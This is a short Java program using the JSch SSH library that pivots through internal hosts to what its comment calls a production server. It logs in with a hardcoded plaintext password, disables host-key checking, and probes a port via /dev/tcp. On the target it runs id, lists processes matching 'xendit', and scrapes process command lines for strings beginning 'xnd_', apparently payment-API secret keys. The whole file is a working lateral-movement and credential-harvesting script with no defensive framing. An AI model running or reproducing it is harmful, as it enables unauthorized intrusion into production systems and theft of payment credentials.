import com.jcraft.jsch.*;
import java.io.*;
class DKNEO {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    // From Sentry host, try SSH to NEO production server
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'echo ---SCAN-NEO-PORT---;timeout 1 bash -c \"echo > /dev/tcp/10.13.16.196/22\" 2>/dev/null && echo 10.13.16.196:22-OPEN || echo CLOSED;echo ---TRY-SSH---;sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 user@10.13.16.196 \"hostname;id;ps aux | grep -iE xendit | grep -v grep | head -5;cat /proc/*/cmdline 2>/dev/null | tr \\\"\\\\0\\\" \\\" \\\" | grep -iE \\\"xnd_\\\" | head -3\" 2>&1 | head -20' 2>&1");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
